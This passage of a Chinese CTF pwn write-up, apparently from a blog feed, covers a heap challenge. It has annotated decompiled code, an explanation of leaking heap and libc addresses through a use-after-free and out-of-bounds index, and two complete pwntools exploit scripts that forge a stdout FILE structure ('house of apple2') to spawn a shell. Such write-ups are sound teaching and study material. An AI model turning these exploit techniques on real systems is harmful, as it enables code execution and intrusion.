&#123;</span><br><span class="line">    menu(v3, a2);</span><br><span class="line">    a2 = &amp;v5;                                   <span class="comment">// 把一个栈地址传给了一个环境变量？</span></span><br><span class="line">    v3 = (__int64 *)&amp;choice;</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v5);              </span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      edit();                                   <span class="comment">// 下标越界，UAF，但是函数结束之后edit函数里申请的chunk全部会被释放掉，虽然有uaf依然可以访问到。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v6;</span><br><span class="line">      show(v6);                                 <span class="comment">// 把2这个数字传了进去,最多只能show两次，每次会减一</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3 = (__int64 *)<span class="string">&quot;Wrong.&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_13E0();</span><br><span class="line">  <span class="keyword">return</span> RFG_chk(retaddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1(retaddr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;choice, &amp;v1);</span><br><span class="line">  v2 = chunk_list[v1];                          <span class="comment">// 没有下标检查</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;msg: &quot;</span>);</span><br><span class="line">  myread(*(_QWORD *)(v2 + <span class="number">8</span>));                  <span class="comment">// 会写到init1中申请的第二个chunk</span></span><br><span class="line">  RFG_chk(retaddr);                             <span class="comment">// 每次RFG（检查返回地址是否被篡改）会删除最后面的两个chunk。也就是myread里调用的那个init1</span></span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show</span><span class="params">(_QWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1((__int64)retaddr);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --*a1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v2);</span><br><span class="line">    v3 = chunk_list[v2];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== shadow msg ===&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(v3 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t look anymore!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>很显然程序有UAF漏洞，所以可以通过tcache attack泄露堆地址和libc地址。这边详细讲讲泄露libc地址。程序每次申请堆块一定是两两申请，并且每个大小都是0x20固定。edit和show函数都是对每次申请的第二个chunk进行操作。准确来说，是从第一个chunk中取第二个chunk的地址，并进行操作。我们逐步分析。</p><p>程序初始执行到菜单时heap分布如下：<img src="https://c-lby.top/images/2024deadsec_wp/%E7%A8%8B%E5%BA%8F%E5%88%9D%E5%A7%8Bheap.png" alt="程序初始heap"></p><p>0x290处的chunk在chunklist中下标为0，如果对其进行操作，比如show，那么就会打印出红框框起来的地址处的内容，对应第二个chunk，然后这个chunk是不在chunklist中的。同理，0x2d0处的chunk在list中，但是操作的是0x300处。</p><p>那么泄露堆地址的思路很简单，只要有chunk被释放进tcachebin，被释放chunk的fd处就会有加密后的堆地址<img src="https://c-lby.top/images/2024deadsec_wp/%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="泄露堆地址">。</p><p>我们经过一个edit操作之后，会多了两组被释放的chunk。红框对应的地址在list中下标为2，会泄露出来绿色框地址处的堆地址。记得解密。</p><p>然后我们劫持一个chunk的[1]处，edit修改为堆地址+0x2a0，show被劫持的那个chunk我们就能泄露main_areana附近的地址了。</p><p>因为chunklist在bss段，并且可以下标越界，所以选择打到stderr，劫持stdout的FILE进行house of apple2。apple2的相关内容在另一篇文章详细展开记录。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;=== shadow msg ===\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    key = p8(c[<span class="number">0</span>] ^ <span class="number">0x60</span>)</span><br><span class="line">    key += p8(c[<span class="number">1</span>] ^ (((key[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | <span class="number">0x3</span>))</span><br><span class="line">    key += p8(c[<span class="number">2</span>] ^ (((key[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">3</span>] ^ (((key[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">4</span>] ^ (((key[<span class="number">3</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">2</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key = u64(key.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap = key &lt;&lt; <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露堆地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_c = r.recv(<span class="number">6</span>)</span><br><span class="line">heap = decrypt(heap_c)</span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(heap+<span class="number">0x2a0</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d90</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + <span class="number">0x21ca70</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x12E3)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>然后Qanux师傅给出了一个利用stdout泄露libc的非预期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#         env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;node5.buuoj.cn&#x27;,29746)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cry</span>):</span><br><span class="line">    ans = cry</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        ans = (ans &gt;&gt; <span class="number">12</span>) ^ cry</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">    <span class="comment">#             env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    p = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>), timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(leak)[-<span class="number">2</span>] != <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">1</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">3</span>] != <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">    libc_base = leak - <span class="number">0x219B20</span></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0x28</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">        <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>),</span><br><span class="line">        <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>),</span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="0x03-User-management"><a href="#0x03-User-management" class="headerlink" title="0x03 User_management"></a>0x03 User_management</h3>]]></content>
    
    
    <summary type="html">非常好国际比赛，使我记忆恢复。</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
</feed>
